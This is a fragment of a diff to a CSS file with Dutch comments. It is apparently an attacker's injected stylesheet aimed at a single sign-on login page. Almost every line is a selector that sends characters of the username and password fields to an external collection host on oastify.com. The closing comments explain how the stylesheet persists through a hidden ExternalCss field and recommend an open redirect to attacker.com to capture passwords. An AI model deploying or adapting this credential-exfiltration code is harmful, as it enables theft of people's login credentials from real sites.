+input#LogOnName[value^="4"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=4') !important; }
+input#LogOnName[value^="5"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=5') !important; }
+input#LogOnName[value^="6"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=6') !important; }
+input#LogOnName[value^="7"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=7') !important; }
+input#LogOnName[value^="8"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=8') !important; }
+input#LogOnName[value^="9"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=9') !important; }
+
+/* ================================================
+   5. USERNAME: KARAKTER-VOOR-KARAKTER EXFILTRATIE
+   Gebruikt list-style-image, border-image, etc. als
+   extra kanalen zodat meerdere selectors tegelijk
+   kunnen matchen (background-image is er maar 1 per
+   element, maar we combineren properties).
+   ================================================ */
+
+/* --- Bevat karakter (a-z) via ~= of *= --- */
+input#LogOnName[value*="a" i] { --ca: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?a'); }
+input#LogOnName[value*="b" i] { --cb: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?b'); }
+input#LogOnName[value*="c" i] { --cc: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?c'); }
+input#LogOnName[value*="d" i] { --cd: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?d'); }
+input#LogOnName[value*="e" i] { --ce: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?e'); }
+input#LogOnName[value*="f" i] { --cf: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?f'); }
+input#LogOnName[value*="g" i] { --cg: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?g'); }
+input#LogOnName[value*="h" i] { --ch: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?h'); }
+input#LogOnName[value*="i" i] { --ci: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?i'); }
+input#LogOnName[value*="j" i] { --cj: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?j'); }
+input#LogOnName[value*="k" i] { --ck: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?k'); }
+input#LogOnName[value*="l" i] { --cl: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?l'); }
+input#LogOnName[value*="m" i] { --cm: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?m'); }
+input#LogOnName[value*="n" i] { --cn: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?n'); }
+input#LogOnName[value*="o" i] { --co: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?o'); }
+input#LogOnName[value*="p" i] { --cp: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?p'); }
+input#LogOnName[value*="q" i] { --cq: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?q'); }
+input#LogOnName[value*="r" i] { --cr: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?r'); }
+input#LogOnName[value*="s" i] { --cs: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?s'); }
+input#LogOnName[value*="t" i] { --ct: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?t'); }
+input#LogOnName[value*="u" i] { --cu: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?u'); }
+input#LogOnName[value*="v" i] { --cv: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?v'); }
+input#LogOnName[value*="w" i] { --cw: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?w'); }
+input#LogOnName[value*="x" i] { --cx: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?x'); }
+input#LogOnName[value*="y" i] { --cy: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?y'); }
+input#LogOnName[value*="z" i] { --cz: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?z'); }
+input#LogOnName[value*="0"]   { --c0: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?0'); }
+input#LogOnName[value*="1"]   { --c1: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?1'); }
+input#LogOnName[value*="2"]   { --c2: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?2'); }
+input#LogOnName[value*="3"]   { --c3: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?3'); }
+input#LogOnName[value*="4"]   { --c4: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?4'); }
+input#LogOnName[value*="5"]   { --c5: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?5'); }
+input#LogOnName[value*="6"]   { --c6: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?6'); }
+input#LogOnName[value*="7"]   { --c7: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?7'); }
+input#LogOnName[value*="8"]   { --c8: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?8'); }
+input#LogOnName[value*="9"]   { --c9: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?9'); }
+input#LogOnName[value*="@"]   { --cat: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?at'); }
+input#LogOnName[value*="."]   { --cdt: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?dot'); }
+input#LogOnName[value*="-"]   { --cda: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?dash'); }
+input#LogOnName[value*="_"]   { --cun: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?under'); }
+
+/* ================================================
+   6. PASSWORD EXFILTRATIE via attribuut-selectors
+   Werkt alleen als de server het wachtwoord terug-
+   geeft in het value attribuut (ongebruikelijk maar
+   komt voor bij sommige frameworks).
+   ================================================ */
+
+/* --- Eerste karakter --- */
+input#Password[value^="a" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=a') !important; }
+input#Password[value^="b" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=b') !important; }
+input#Password[value^="c" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=c') !important; }
+input#Password[value^="d" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=d') !important; }
+input#Password[value^="e" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=e') !important; }
+input#Password[value^="f" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=f') !important; }
+input#Password[value^="g" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=g') !important; }
+input#Password[value^="h" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=h') !important; }
+input#Password[value^="i" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=i') !important; }
+input#Password[value^="j" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=j') !important; }
+input#Password[value^="k" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=k') !important; }
+input#Password[value^="l" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=l') !important; }
+input#Password[value^="m" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=m') !important; }
+input#Password[value^="n" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=n') !important; }
+input#Password[value^="o" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=o') !important; }
+input#Password[value^="p" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=p') !important; }
+input#Password[value^="q" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=q') !important; }
+input#Password[value^="r" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=r') !important; }
+input#Password[value^="s" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=s') !important; }
+input#Password[value^="t" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=t') !important; }
+input#Password[value^="u" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=u') !important; }
+input#Password[value^="v" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=v') !important; }
+input#Password[value^="w" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=w') !important; }
+input#Password[value^="x" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=x') !important; }
+input#Password[value^="y" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=y') !important; }
+input#Password[value^="z" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=z') !important; }
+input#Password[value^="0"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=0') !important; }
+input#Password[value^="1"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=1') !important; }
+input#Password[value^="2"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=2') !important; }
+input#Password[value^="3"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=3') !important; }
+input#Password[value^="4"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=4') !important; }
+input#Password[value^="5"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=5') !important; }
+input#Password[value^="6"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=6') !important; }
+input#Password[value^="7"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=7') !important; }
+input#Password[value^="8"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=8') !important; }
+input#Password[value^="9"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=9') !important; }
 
 /* ================================================
    OPMERKINGEN:
-   - @font-face + unicode-range detecteert welke
-     UNIEKE karakters voorkomen (niet de volgorde).
-   - Voor volledige volgorde-reconstructie: combineer
-     met open redirect (ru=attacker.com) of gebruik
-     server-side dynamische CSS met @import chaining.
-   - -webkit-text-security werkt in Chrome/Edge,
-     niet in Firefox.
+   - Attribuut-selectors matchen op het HTML value
+     attribuut, niet de JS property. Ze werken dus
+     NIET bij het typen, maar WEL wanneer de server
+     de waarde teruggeeft na form submission.
+   - De SSO loginpagina reflecteert de username na
+     mislukte login → selectors triggeren dan.
+   - ExternalCss= persisteert als hidden field →
+     evil.css wordt bij elke page render geladen.
+   - CSS custom properties (--cx) met url() worden
+     pas gefetcht wanneer ze via var() gebruikt
+     worden. Voor directe exfiltratie zonder var()
+     gebruik background-image (1 per element).
+   - Wachtwoord-exfiltratie via CSS is beperkt
+     omdat servers passwords zelden reflecteren.
+     Primaire wachtwoord-capture: open redirect
+     (ru=attacker.com) na succesvolle login.
    ================================================ */
